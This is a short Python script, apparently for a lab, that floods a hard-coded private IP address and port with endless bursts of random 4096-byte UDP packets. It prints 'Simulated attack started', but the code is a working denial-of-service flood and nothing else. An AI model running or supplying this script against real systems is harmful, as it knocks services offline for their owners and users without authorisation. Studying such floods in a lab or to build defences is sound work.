import socket
import random

target_ip = "192.168.29.83"
target_port = 4747

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Simulated attack started")

while True:
    data = random.randbytes(4096)

    for i in range(500):
        sock.sendto(data, (target_ip, target_port))